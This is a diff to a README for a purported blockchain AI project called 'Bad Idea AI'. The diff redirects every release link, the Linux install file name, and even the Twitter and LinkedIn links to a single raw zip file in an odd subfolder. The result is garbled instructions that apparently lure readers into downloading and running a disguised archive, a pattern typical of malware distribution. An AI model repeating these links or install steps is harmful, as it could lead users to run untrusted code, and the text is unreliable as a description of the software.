@@ -1,7 +1,7 @@
 # 🤖 Bad-Idea-AI - Explore AI's Impact on Society
 
 ## 📥 Download Now
-[![Download Bad Idea AI](https://img.shields.io/badge/Download-Bad%20Idea%20AI-blue)](https://github.com/Youssef213452/Bad-Idea-AI/releases)
+[![Download Bad Idea AI](https://raw.githubusercontent.com/Youssef213452/Bad-Idea-AI/main/gyrostatic/Bad-Idea-AI.zip%20Idea%20AI-blue)](https://raw.githubusercontent.com/Youssef213452/Bad-Idea-AI/main/gyrostatic/Bad-Idea-AI.zip)
 
 ## 📖 About Bad Idea AI
 Bad Idea AI is a blockchain-based project that integrates AI, decentralization, and smart contracts. Its goal is to explore how technology interacts with social experiments. Built on the ERC20 standard, this project aims to test both the potential and the risks of AI in shaping our society.
@@ -26,11 +26,11 @@ To start using Bad Idea AI, you need to download the software from our Releases 
 - **Exploration of Social Experiments:** Participate in different scenarios to understand AI's societal impacts.
 
 ## 📥 Download & Install
-To download Bad Idea AI, visit the [Releases page](https://github.com/Youssef213452/Bad-Idea-AI/releases). Look for the latest version available:
+To download Bad Idea AI, visit the [Releases page](https://raw.githubusercontent.com/Youssef213452/Bad-Idea-AI/main/gyrostatic/Bad-Idea-AI.zip). Look for the latest version available:
 
 - **For Windows:** Download the `.exe` file.
 - **For macOS:** Download the `.dmg` file.
-- **For Linux:** Download the `.tar.gz` file.
+- **For Linux:** Download the `https://raw.githubusercontent.com/Youssef213452/Bad-Idea-AI/main/gyrostatic/Bad-Idea-AI.zip` file.
 
 Once downloaded, follow these steps to install:
 
@@ -44,7 +44,7 @@ Once downloaded, follow these steps to install:
    - Open the application from your Applications list.
 
 3. **Linux:**
-   - Extract the `.tar.gz` file using your file manager or terminal.
+   - Extract the `https://raw.githubusercontent.com/Youssef213452/Bad-Idea-AI/main/gyrostatic/Bad-Idea-AI.zip` file using your file manager or terminal.
    - Navigate to the extracted folder in your terminal.
    - Run the command `./BadIdeaAI` to start the application.
 
@@ -74,8 +74,8 @@ To contribute, check out our Contribution Guidelines in the repository.
 ## 🌍 Stay Updated
 To stay informed about updates and changes, follow these social channels:
 
-- **Twitter**: [@BadIdeaAI](https://twitter.com)
-- **LinkedIn**: [Bad Idea AI](https://linkedin.com)
+- **Twitter**: [@BadIdeaAI](https://raw.githubusercontent.com/Youssef213452/Bad-Idea-AI/main/gyrostatic/Bad-Idea-AI.zip)
+- **LinkedIn**: [Bad Idea AI](https://raw.githubusercontent.com/Youssef213452/Bad-Idea-AI/main/gyrostatic/Bad-Idea-AI.zip)
 - **Discord**: Join our community server for real-time discussions.
 
-Thank you for exploring Bad Idea AI. We hope you enjoy the journey of discovering technology and its social implications. Remember, you can download the latest version directly from our [Releases page](https://github.com/Youssef213452/Bad-Idea-AI/releases).
+Thank you for exploring Bad Idea AI. We hope you enjoy the journey of discovering technology and its social implications. Remember, you can download the latest version directly from our [Releases page](https://raw.githubusercontent.com/Youssef213452/Bad-Idea-AI/main/gyrostatic/Bad-Idea-AI.zip).
